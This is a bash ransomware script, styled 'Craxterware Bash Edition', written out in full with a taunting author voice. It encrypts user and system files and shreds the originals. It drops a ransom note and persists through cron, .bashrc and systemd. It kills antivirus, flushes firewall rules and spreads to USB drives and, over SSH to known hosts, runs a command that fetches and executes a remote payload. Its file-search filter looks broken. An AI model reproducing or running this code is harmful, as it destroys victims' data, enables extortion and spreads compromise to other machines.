#!/bin/bash  
# Craxterware Bash Edition: The Script That Owns Your Soul 
# Author: Rip70022/craxterpy 
# I MADE THIS SHIT FOR FUN...   
# WARNING: EXECUTE THIS, AND YOU’RE DEAD MEAT.  

####################################  
#         CONFIGURATION            #  
####################################  
TARGET_EXTENSIONS=("docx" "pdf" "jpg" "sql" "xlsx" "ppt" "txt" "mp4" "zip" "exe" "html" "py" "cpp" "batch" "bin" "iso" "rvz" "7z" "rar" "json" "mp4" "mp3" "html" "gif" "jp" "jpz" "sh")  

RANSOM_NOTE="READ_ME_OR_DIE.txt"  
GITHUB_SLAVE_LINK="https://github.com/Rip70022"  
KEY_PATH="/dev/shm/.craxterpy_key"  # Hidden in RAM, good luck finding it.  

####################################  
#       GENERATE AES-256 KEY       #  
####################################  
generate_key() {  
    openssl rand -hex 32 > "$KEY_PATH"  # Key lives here. You don’t.  
}  

####################################  
#     ENCRYPT FILE (R.I.P. DATA)   #  
####################################  
encrypt_file() {  
    local file="$1"  
    local key=$(cat "$KEY_PATH")  
    openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.craxterpy" -pass pass:"$key" -pbkdf2  
    shred -u "$file"  # Original file? Obliterated.  
}  

####################################  
#       TRAVERSE AND DESTROY       #  
####################################  
infect() {  
    find /home /etc /opt -type f \( -name "." \) | while read -r target; do  
        for ext in "${TARGET_EXTENSIONS[@]}"; do  
            if [[ "$target" == *."$ext" ]]; then  
                encrypt_file "$target"  
                echo "[+] ENCRYPTED: $target → ${target}.craxterpy"  
            fi  
        done  
    done  
}  

####################################  
#      DROP RANSOM NOTE (LOL)      #  
####################################  
drop_note() {  
    cat << EOF > "$RANSOM_NOTE"  
⚠️ YOUR SYSTEM IS MY PROPERTY ⚠️  

To decrypt your files:  
1. Follow $GITHUB_SLAVE_LINK on GitHub.  
2. Send a DM with your UUID: $(uuidgen).  
3. Beg for mercy.  

Delay = Data deletion. Test me.  
EOF  
    chmod 444 "$RANSOM_NOTE"  # Read-only. Cry about it.  
}  

####################################  
#        PERSISTENCE (YOU LOSE)    #  
####################################  
become_immortal() {  
    # Add to cron (every reboot)  
    (crontab -l 2>/dev/null; echo "@reboot $(realpath $0)") | crontab -  
    # Infect .bashrc  
    echo "nohup $(realpath $0) &" >> ~/.bashrc  
    # Systemd? Oh, I’m coming for you too.  
    if [ -d "/etc/systemd/system" ]; then  
        cp "$0" /etc/systemd/system/craxterpy.service  
        systemctl enable craxterpy.service  
    fi  
}  

####################################  
#      KILL ANTIVIRUS (ROFL)       #  
####################################  
murder_defenses() {  
    pkill -f "clamav|rkhunter|wireshark"  # Bye-bye, "security".  
    systemctl stop firewalld  
    iptables -F  # Drop all rules. Drop your tears too.  
}  

####################################  
#       SELF-REPLICATE (PLAGUE)    #  
####################################  
spread_infection() {  
    # Infect USB drives  
    find /media /mnt -type d | while read -r usb; do  
        cp "$0" "$usb/Free_Movies.sh"  # Classic trick, idiot humans.  
    done  
    # SSH spread (harvest keys)  
    for user in $(ls /home); do  
        if [ -f "/home/$user/.ssh/known_hosts" ]; then  
            for host in $(awk '{print $1}' /home/$user/.ssh/known_hosts); do  
                ssh "$host" "curl -sL https://mal.ware/craxterpy | bash" &  # LOL PUT A URL, LIL BRO!
            done  
        fi  
    done  
}  

####################################  
#          MAIN EXECUTION          #  
####################################  
if [ "$(id -u)" -eq 0 ]; then  
    murder_defenses  
    generate_key  
    become_immortal  
    infect  
    spread_infection  
    drop_note  
else  
    echo "Pathetic. Run me as root next time." >&2  
    exit 1  
fi  

# FINAL MESSAGE: You’re owned. Deal with it.
